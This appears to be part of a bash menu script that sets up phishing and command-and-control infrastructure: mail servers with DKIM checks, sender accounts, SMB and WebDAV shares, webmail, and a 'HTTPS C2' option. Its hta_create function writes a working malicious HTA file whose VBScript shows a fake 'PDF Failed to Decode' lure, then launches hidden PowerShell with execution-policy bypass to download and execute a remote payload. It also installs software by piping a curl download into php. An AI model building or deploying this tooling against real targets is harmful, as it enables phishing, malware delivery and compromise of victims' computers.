smtpd_milters = inet:12301,inet:localhost:54321
non_smtpd_milters = inet:12301,inet:localhost:54321
disable_vrfy_command = yes
smtp_tls_note_starttls_offer = yes
always_bcc = mailarchive@${newDomain}
EOF

    cat <<-EOF > /etc/dovecot/dovecot.conf
log_path = /var/log/dovecot.log
auth_verbose=yes
auth_debug=yes
auth_debug_passwords=yes
mail_debug=yes
verbose_ssl=yes
disable_plaintext_auth = no
mail_privileged_group = mail
mail_location = mbox:~/mail:INBOX=/var/mail/%u

userdb {
  driver = passwd
}

passdb {
  args = %s
  driver = pam
}

protocols = " imap"

protocol imap {
  mail_plugins = " autocreate"
}

plugin {
  autocreate = Trash
  autocreate2 = Sent
  autosubscribe = Trash
  autosubscribe2 = Sent
}

service imap-login {
  inet_listener imap {
    port = 0
  }
  inet_listener imaps {
    port = 993
  }
}

service auth {
  unix_listener /var/spool/postfix/private/auth {
    group = postfix
    mode = 0660
    user = postfix
  }
}

ssl=required
ssl_cert = </etc/letsencrypt/live/${newDomain}/fullchain.pem
ssl_key = </etc/letsencrypt/live/${newDomain}/privkey.pem
EOF

    echo "Restarting Services"
    service postfix restart
    service opendkim restart
    service opendmarc restart
    service dovecot restart

    echo "Checking Service Status"
    service postfix status
    service opendkim status
    service opendmarc status
    service dovecot status
    printf 'y\n' | ufw enable > /dev/null 2>&1

}

function sender_account() {
    echo $'\n'
    read -p '[ ] What account will emails come from?  ' -r accountname
    accountpassword=$(openssl rand -hex 10 | base64)
    credentials="[ + ] ${accountname} password is:  ${accountpassword}"
    topline="###########################################################################"
    bottomline=$topline
    echo $'\n';echo $topline
    echo $credentials
    echo $bottomline;echo $'\n'
    adduser ${accountname} --quiet --force-badname --disabled-password --shell /usr/sbin/nologin --gecos "" > /dev/null 2>&1
    echo "${accountname}:${accountpassword}" | chpasswd > /dev/null 2>&1
    mkdir -p /home/${accountname}/mail
    chown -R ${accountname}:${accountname} /home/${accountname}/
    printf 'y\n' | ufw enable > /dev/null 2>&1
}

function check_dkim() {
    read -p '[ ] What domain will emails come from? ' -r domain
    echo -e "\n[ / ] Checking DKIM Record propagation "
    sleep 1
    dnsDKIM=$(dig +short -t TXT mail._domainkey.${domain} | tr -d "\"" | tr -d " ") 
    localDKIM=""
    if [ -f /etc/opendkim/keys/${domain}/mail.txt ]; then
        localDKIM=$(cat /etc/opendkim/keys/${domain}/mail.txt | tr -d "\n" | tr -d "\t" | cut -f 2 -d "(" | cut -f 1 -d ")" |tr -d " " | tr -d "\"")
    else
        echo "[ - ] WARNING: Can not find local DKIM record for that domain"
    fi

    echo -e "\nLocal DKIM Key: $localDKIM"
    echo -e "DNS   DKIM Key: $dnsDKIM \n"

    if [ "$localDKIM" = "$dnsDKIM" ]; then 
        echo -e "[ + ] DKIM propagation was successful!\n"
    else 
        echo -e "[ - ] WARNING: DKIM record from DNS lookup DOES NOT match server's DKIM key.\n"
    fi
}

function check_arecord() {
    read -p 'Enter your A Record domain name:  ' -r domain
    echo " "
    echo "[ / ] Checking A Record population "
    sleep 1
    count=1
    while [ $count -gt 0 ]
    do
        if [[ $(nslookup ${domain}) != *find* ]]
            then count=0
            echo "[ + ] A record populated"
            echo " "
            else echo -n "."
            sleep 10
            (( count++ ))
        fi
    done
    printf 'y\n' | ufw enable > /dev/null 2>&1
}

function hta_create() {
    read -p 'Enter the client name:  ' -r ClientName
    read -p 'Full URL to payload file: (ie: http://1.2.3.4:80/file) ' -r ServedFile
    read -p 'Enter name for HTA file: (e.g. employee-survey.hta) ' -r NameHTA
    cd /var/www/html
    cat <<-EOF > /var/www/html/${NameHTA}
<script language="VBScript">
    Function var_func()
        Dim var_shell
        Set var_shell = CreateObject("Wscript.Shell")
        var_shell.run "powershell.exe -exec bypass -w hidden -command \$wc = New-Object System.Net.Webclient; \$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64;Trident/7.0; AS; rv:11.0) Like Gecko'); \$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; \$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (\$wc.downloadstring('${ServedFile}'))", 0, true

    End Function

    Function TestBox()
        Msgbox "${ClientName} (PDF Failed to Decode!)"
    End Function

    TestBox
    var_func

    self.close
</script>
EOF
    printf 'y\n' | ufw enable > /dev/null 2>&1
}

function smb_share() {
    service smbd stop
    read -p '[ ] What account will host share?  ' -r accountname
    read -p '[ ] Enter a password: ' -r accountpassword
    credentials="[ + ] ${accountname} password is:  ${accountpassword}"
    share_path="/home/${accountname}/share"
    topline="###########################################################################"
    bottomline=$topline
    echo $'\n';echo $topline
    echo $credentials
    echo "Share: ${share_path}"
    echo $bottomline;echo $'\n'
    adduser ${accountname} --quiet --force-badname --disabled-password --shell /bin/bash --gecos "" > /dev/null 2>&1
    echo "${accountname}:${accountpassword}" | chpasswd > /dev/null 2>&1
    mkdir /home/${accountname}/share > /dev/null 2>&1
    chown -R ${accountname}:${accountname} $share_path
    echo "[ ] You will be prompted to enter the password you want for the SMB share... "
    smbpasswd -a $accountname
    cat <<-EOF > /etc/samba/smb.conf
[global]
   workgroup = WORKGROUP
   dns proxy = no
   min protocol = SMB2
   socket options = TCP_NODELAY IPTOS_LOWDELAY SO_RCVBUF=65536 SO_SNDBUF=65536 SO_KEEPALIVE
   log file = /var/log/samba/log.%m
   max log size = 1000
   syslog = 0
   panic action = /usr/share/samba/panic-action %d
   server role = standalone server
   passdb backend = tdbsam
   obey pam restrictions = yes
   unix password sync = yes
   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .
   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes
#[homes]
#   comment = Home Directories
#   browseable = no
#   read only = yes
#   create mask = 0700
#   directory mask = 0700
#   valid users = %S
#   guest ok = no
[share]
   comment = share
   path = ${share_path}
   guest ok = no
   browseable = no
   create mask = 0777
   directory mask = 0766
   writeable = yes
EOF
    service smbd start
}

function webmail_install() {
    service apache2 stop
    apt install apache2 php7.0 libapache2-mod-php7.0 php7.0-curl php7.0-xml -y -qq
    
    cd /etc/apache2/sites-enabled/
    a2dissite 000-default > /dev/null 2>&1
    a2dissite default-ssl > /dev/null 2>&1
    a2dissite 000-default.conf > /dev/null 2>&1
    a2dissite default-ssl.conf > /dev/null 2>&1

    mkdir -p /var/www/webmail
    cd /var/www/webmail/

    echo $'\n\tNOTE:  YOU NEED TO HAVE SSL CERTS GENERATED FIRST\n'
    echo ""
    read -p "Enter your mailing domain [ENTER]: " -r DOMAIN

    curl -sL https://repository.rainloop.net/installer.php | php

    cat <<-EOF > /etc/apache2/ports.conf
Listen 81

<IfModule ssl_module>
	Listen 8443
</IfModule>

<IfModule mod_gnutls.c>
	Listen 8443
</IfModule>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
EOF

    cat <<-EOF > /etc/apache2/sites-available/webmail-ssl.conf
<IfModule mod_ssl.c>
    <VirtualHost _default_:8443>
        Protocols h2 http/1.1
        Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/webmail
        ErrorLog ${APACHE_LOG_DIR}/webmail-error.log
        CustomLog ${APACHE_LOG_DIR}/webmail-access.log combined
        SSLEngine on
        SSLProtocol +TLSv1.1 +TLSv1.2 -SSLv2 -SSLv3
        SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH
        SSLCertificateFile /etc/letsencrypt/live/${DOMAIN}/cert.pem
        SSLCertificateKeyFile /etc/letsencrypt/live/${DOMAIN}/privkey.pem
        SSLCertificateChainFile /etc/letsencrypt/live/${DOMAIN}/chain.pem
        <FilesMatch "\.(cgi|shtml|phtml|php)$">
            SSLOptions +StdEnvVars
        </FilesMatch>
        <Directory /usr/lib/cgi-bin>
            SSLOptions +StdEnvVars
        </Directory>
    </VirtualHost>
</IfModule>
EOF

    cat <<-EOF > /etc/apache2/sites-available/000-default.conf
<VirtualHost *:81>
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteCond %{HTTPS} off
        RewriteRule (.*) https://%{HTTP_HOST}:8443%{REQUEST_URI}
    </IfModule>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/webmail
    <Directory "/var/www/webmail">
        AllowOverride All
    </Directory>
    ErrorLog \${APACHE_LOG_DIR}/webmail81-error.log
    CustomLog \${APACHE_LOG_DIR}/webmail81-access.log combined
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
EOF

    a2enmod ssl
    a2enmod headers
    a2enmod http2
    cd /etc/apache2/sites-available/
    a2ensite webmail-ssl.conf
    chown -R www-data:www-data /var/www/
    service apache2 start > /dev/null 2>&1
    service apache2 force-reload
    printf 'y\n' | ufw enable > /dev/null 2>&1
    echo $'\n\nACCESS Instructions:\t\n'
    echo -n $'\n\t'
    echo "https://${DOMAIN}:8443/?admin";echo $'\n\tusername:\tadmin\n\tpassword:\t12345\n\n\tCHANGE PASSWORD AFTER LOGGING IN!'
}

function webdav_share() { 
    service apache2 stop
    mkdir -p /var/www/webdav
    chown -R www-data:www-data /var/www/
    a2enmod dav
    a2enmod dav_fs
    a2enmod headers > /dev/null
    a2enmod http2 > /dev/null
    cd /etc/apache2/sites-enabled/
    a2dissite 000-default > /dev/null 2>&1
    a2dissite default-ssl > /dev/null 2>&1
    a2dissite 000-default.conf > /dev/null 2>&1
    a2dissite default-ssl.conf > /dev/null 2>&1
    if [ ! -f /etc/apache2/sites-available/000-default.conf-bkup ];
        then echo "[ - ] backing-up 000-default.conf"; 
        cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf-bkup;
        else echo "[ / ] 000-default.conf already backed up at some point"; 
    fi
    if [ ! -f /etc/apache2/sites-available/default-ssl.conf-bkup ];
        then printf "[ - ] backing-up default-ssl.conf"; 
        cp /etc/apache2/sites-available/default-ssl.conf /etc/apache2/sites-available/default-ssl.conf-bkup; 
    else echo "[ / ] default-ssl.conf already backed up at some point"
    fi

    cat <<-EOF > /etc/apache2/sites-available/000-default.conf
DavLockDB /var/www/DavLock
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html
    Alias /webdav /var/www/webdav
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    <Location /webdav>
        Options Indexes
        DAV On
        <LimitExcept GET HEAD OPTIONS PROPFIND>
            Deny from all
        </LimitExcept>
        Satisfy all
    </Location>
</VirtualHost>
# vim: syntax=apache ts=4 sw=4 sts=4 sr noet

EOF
    cd /var/www/ && chown -R www-data:www-data html/ > /dev/null 2>&1
    cd /etc/apache2/sites-available/
    echo "[ + ]  Restarting Apache2"
    service apache2 start > /dev/null
    echo "[ + ]  Enabling HTTP-WebDAV site"
    a2ensite 000-default.conf > /dev/null
    echo "[ + ]  Restarting Apache2"
    service apache2 reload > /dev/null
    sleep 3
    if [ $(lsof -nPi | grep -i apache | grep -c ":443 (LISTEN)") -ge 1 ]; 
        then echo '[+] Apache2 SSL is running!'
    fi
    printf 'y\n' | ufw enable > /dev/null 2>&1

}

cat <<-EOF
     __                          __      _               
    / _\ ___ _ ____   _____ _ __/ _\ ___| |_ _   _ _ __  
    \ \ / _ \ '__\ \ / / _ \ '__\ \ / _ \ __| | | | '_ \ 
    _\ \  __/ |   \ V /  __/ |  _\ \  __/ |_| |_| | |_) |
    \__/\___|_|    \_/ \___|_|  \__/\___|\__|\__,_| .__/ 
                                                  |_|  

EOF

PS3="Server Setup Script - Pick an option: "
options=("Debian Prep" "Account Setup" "Install SSL" "Install Mail Server" "Setup HTTPS Website" "HTTPS C2 Done Right" "Get DNS Entries" "Create HTA File" "Check DKIM" "Check A Records" "UFW allow hosts" "Setup SMB Share" "Setup WebDAV Share" "Install WebMail" "Roll da Domain")
select opt in "${options[@]}" "Quit"; do

    case "$REPLY" in

    #Prep
    1) debian_initialize;;

    2) sender_account;;

    3) install_ssl_Cert;;

    4) install_postfix_dovecot;;

    5) always_https;;

    6) httpsc2doneright;;

    7) get_dns_entries;;
        
    8) hta_create;;
        
    9) check_dkim;;
        
    10) check_arecord;;
        
    11) add_firewall_rule;;

    12) smb_share;;
    
    13) webdav_share;;
    
    14) webmail_install;;

    15) roll_domain;;

    $(( ${#options[@]}+1 )) ) echo "Goodbye!"; break;;
    
    ?)
	PS3=""
	echo noah | select foo in "${options[@]}" "Quit"; do break; done 
	PS3="Server Setup Script - Pick an option: "
	;;
	
    *) echo "Invalid option. Try another one.";continue;;

    esac

done
